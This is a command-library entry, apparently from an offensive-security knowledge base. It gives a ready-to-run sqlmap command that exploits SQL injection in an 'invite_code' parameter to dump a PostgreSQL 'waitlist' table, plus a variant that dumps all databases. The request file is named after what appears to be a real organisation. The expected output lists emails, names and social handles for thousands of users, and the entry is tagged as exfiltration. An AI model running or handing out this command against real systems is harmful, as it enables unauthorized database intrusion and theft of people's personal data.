---
id: cmd-uuid-2
data: >-
  sqlmap -r sqli-mozilla.req --level=3 -p invite_code --dbms=postgresql -D
  public -T waitlist --dump --force-ssl
tags:
  - sqli
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.182Z'
verified: false
validated: true
submitted: true
---
# sqlmap-dump-waitlist

## Command

```bash
sqlmap -r sqli-mozilla.req --level=3 -p invite_code --dbms=postgresql -D public -T waitlist --dump --force-ssl
```

## Description

This command exploits SQLi to dump all data from the specified waitlist table in the public database, extracting sensitive user information via the invite_code parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-r sqli-mozilla.req` | Load request from file | Yes |
| `--level=3` | Set test level | No |
| `-p invite_code` | Injection point | Yes |
| `--dbms=postgresql` | DBMS type | Yes |
| `-D public` | Target database | Yes |
| `-T waitlist` | Target table | Yes |
| `--dump` | Dump table contents | Yes |
| `--force-ssl` | Use SSL | No |

## Examples

### Basic Usage

```bash
sqlmap -r req.req -p param --dbms=postgresql -D db -T table --dump
```

### Advanced Usage

```bash
sqlmap -r sqli-mozilla.req --level=3 -p invite_code --dbms=postgresql -D public -T waitlist --dump-all --force-ssl
```

## Expected Output

Table: waitlist (9438 entries)
Columns: email, first_name, id, last_name, mastodon_handle, twitter_handle
Followed by row data dumps.

## Related

- [[Related Procedure: Data-Exfiltration-from-Waitlist-Table]]
